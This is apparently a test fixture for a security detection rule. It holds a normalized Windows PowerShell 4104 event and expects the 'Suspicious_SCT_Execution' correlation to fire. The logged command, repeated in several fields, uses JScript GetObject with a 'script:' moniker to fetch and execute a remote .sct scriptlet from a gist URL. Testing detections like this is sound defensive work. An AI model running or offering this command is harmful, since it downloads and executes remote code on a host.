{"action": "execute", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2023-06-28T04:57:41.980608100Z\"},\"EventRecordID\":\"1247910\",\"Correlation\":{\"ActivityID\":\"{fc27780d-9e5b-0000-e115-aafd5b9ed901}\"},\"Execution\":{\"ProcessID\":\"2040\",\"ThreadID\":\"5388\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"pc.domain.loc\",\"Security\":{\"UserID\":\"S-1-5-21-936165926-1453112849-1990505774-500\"}},\"EventData\":{\"Data\":[{\"text\":\"1\",\"Name\":\"MessageNumber\"},{\"text\":\"1\",\"Name\":\"MessageTotal\"},{\"text\":\"[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject(\\\"script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct\\\").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())\",\"Name\":\"ScriptBlockText\"},{\"text\":\"1b4f6cb4-8d5f-4df1-bd67-bd6e6517a360\",\"Name\":\"ScriptBlockId\"},{\"Name\":\"Path\"}]}}}", "category.generic": "Command", "category.high": "System Management", "category.low": "Manipulation", "datafield5": "[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject(\"script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct\").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())", "event_src.category": "Operating system", "event_src.fqdn": "pc.domain.loc", "event_src.host": "pc.domain.loc", "event_src.hostname": "pc", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "4104", "normalized": true, "numfield1": 1, "numfield2": 1, "object": "command", "object.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "object.id": "1b4f6cb4-8d5f-4df1-bd67-bd6e6517a360", "object.process.cmdline": "[ Reflection.Assembly ]::LoadWithPartialName('Microsoft.JScript');[ Microsoft.JScript.Eval ]::JScriptEvaluate('GetObject(\"script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct\").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())", "object.process.id": "2040", "object.value": "[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject(\"script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct\").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())", "recv_ipv4": "127.0.0.1", "recv_time": "2023-06-28T23:31:57.815Z", "status": "success", "subject": "account", "subject.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "subject.id": "S-1-5-21-936165926-1453112849-1990505774-500", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2023-06-28T04:57:41.980Z", "type": "raw", "uuid": "53cc5a8a-83ca-4866-ad33-10003ad2fa51"}

expect 1 {"correlation_name": "Suspicious_SCT_Execution"}